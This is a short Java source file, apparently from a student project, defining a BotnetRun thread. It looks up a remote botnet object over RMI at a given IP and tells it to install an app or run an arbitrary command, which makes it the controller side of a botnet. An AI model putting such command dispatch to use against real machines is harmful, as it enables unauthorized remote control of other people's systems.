/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import model.IBotnet;

/**
 *
 * @author ligirk
 */
public class BotnetRun extends Thread{
    private String ip;
    private String cmd;
    private String type;
    private ArrayList <String> return_string;
    public BotnetRun(String ip,String type, String cmd){
        this.ip = ip;
        this.type = type;
        this.cmd = cmd;
    }
    public void run(){
        try {
            IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + this.ip + ":" + "1234" + "/BotnetRMI");
            if (this.type.equals("install")){
                this.return_string = botnet.installApp("");
            }
            if (this.type.equals("run")){
                this.return_string = botnet.runCommand(cmd);
            }
        } catch (Exception ex) {
            this.return_string = null;
        }
    }
    
    public ArrayList <String> get_values(){
        return this.return_string;
    }
    
}